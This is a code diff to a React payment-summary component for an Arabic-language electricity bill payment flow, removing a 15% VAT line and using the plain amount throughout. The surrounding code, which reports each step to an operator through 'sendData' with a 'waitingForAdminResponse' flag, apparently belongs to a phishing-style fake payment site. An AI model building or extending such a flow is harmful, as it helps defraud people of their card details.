@@ -43,8 +43,6 @@ export default function SummaryPayment() {
   }, []);
 
   const totalAmount = parseFloat(payAmount);
-  const vatAmount = parseFloat((totalAmount * 0.15).toFixed(2));
-  const totalWithVat = parseFloat((totalAmount + vatAmount).toFixed(2));
 
   // Show popup after 2 seconds
   useEffect(() => {
@@ -85,7 +83,7 @@ export default function SummaryPayment() {
 
     sendData({
       data: {
-        'المجموع الكلي': `${totalWithVat} ر.س`,
+        'المجموع الكلي': `${totalAmount.toFixed(2)} ر.س`,
       },
       current: 'الملخص والدفع',
       waitingForAdminResponse: false,
@@ -96,8 +94,7 @@ export default function SummaryPayment() {
         paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
         serviceName: 'دفع فاتورة الكهرباء',
         servicePrice: totalAmount,
-        vatAmount,
-        totalAmount: totalWithVat,
+        totalAmount: totalAmount,
       },
       current: 'ملخص الدفع',
       nextPage: selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
@@ -107,9 +104,9 @@ export default function SummaryPayment() {
     setTimeout(() => {
       setIsProcessing(false);
       if (selectedPaymentMethod === 'card') {
-        clientNavigate(`/credit-card-payment?service=${encodeURIComponent('دفع فاتورة الكهرباء')}&amount=${totalWithVat}`);
+        clientNavigate(`/credit-card-payment?service=${encodeURIComponent('دفع فاتورة الكهرباء')}&amount=${totalAmount}`);
       } else {
-        clientNavigate(`/bank-transfer?service=${encodeURIComponent('دفع فاتورة الكهرباء')}&amount=${totalWithVat}`);
+        clientNavigate(`/bank-transfer?service=${encodeURIComponent('دفع فاتورة الكهرباء')}&amount=${totalAmount}`);
       }
     }, 1500);
   };
@@ -269,12 +266,6 @@ export default function SummaryPayment() {
                 <span style={{ color: '#001f5e', fontSize: '14px', fontWeight: 500 }}>{totalAmount.toFixed(2)} ر.س</span>
               </div>
 
-              {/* VAT */}
-              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 0', borderBottom: '1px solid #e8ecf1' }}>
-                <span style={{ color: '#66799e', fontSize: '14px' }}>ضريبة القيمة المضافة (15%)</span>
-                <span style={{ color: '#001f5e', fontSize: '14px', fontWeight: 500 }}>{vatAmount.toFixed(2)} ر.س</span>
-              </div>
-
               {/* Total */}
               <div style={{
                 display: 'flex', justifyContent: 'space-between', alignItems: 'center',
@@ -282,7 +273,7 @@ export default function SummaryPayment() {
                 background: 'rgba(0,102,204,0.06)', borderRadius: '10px',
               }}>
                 <span style={{ color: '#06c', fontSize: '16px', fontWeight: 600 }}>المجموع الكلي</span>
-                <span style={{ color: '#06c', fontSize: '20px', fontWeight: 700 }}>{totalWithVat.toFixed(2)} ر.س</span>
+                <span style={{ color: '#06c', fontSize: '20px', fontWeight: 700 }}>{totalAmount.toFixed(2)} ر.س</span>
               </div>
             </div>
 
@@ -301,18 +292,14 @@ export default function SummaryPayment() {
                   <span style={{ color: '#66799e', fontSize: '14px' }}>الخدمة</span>
                   <span style={{ color: '#001f5e', fontSize: '13px', fontWeight: 500 }}>دفع فاتورة الكهرباء</span>
                 </div>
-                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
                   <span style={{ color: '#66799e', fontSize: '14px' }}>الرسوم</span>
                   <span style={{ color: '#001f5e', fontSize: '14px' }}>{totalAmount.toFixed(2)} ر.س</span>
-                </div>
-                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
-                  <span style={{ color: '#66799e', fontSize: '14px' }}>الضريبة</span>
-                  <span style={{ color: '#001f5e', fontSize: '14px' }}>{vatAmount.toFixed(2)} ر.س</span>
                 </div>
                 <hr style={{ border: 'none', borderTop: '1px solid #e8ecf1', marginBottom: '16px' }} />
                 <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '24px' }}>
                   <span style={{ color: '#001f5e', fontSize: '16px', fontWeight: 700 }}>المجموع</span>
-                  <span style={{ color: '#06c', fontSize: '18px', fontWeight: 700 }}>{totalWithVat.toFixed(2)} ر.س</span>
+                  <span style={{ color: '#06c', fontSize: '18px', fontWeight: 700 }}>{totalAmount.toFixed(2)} ر.س</span>
                 </div>
 
                 <button
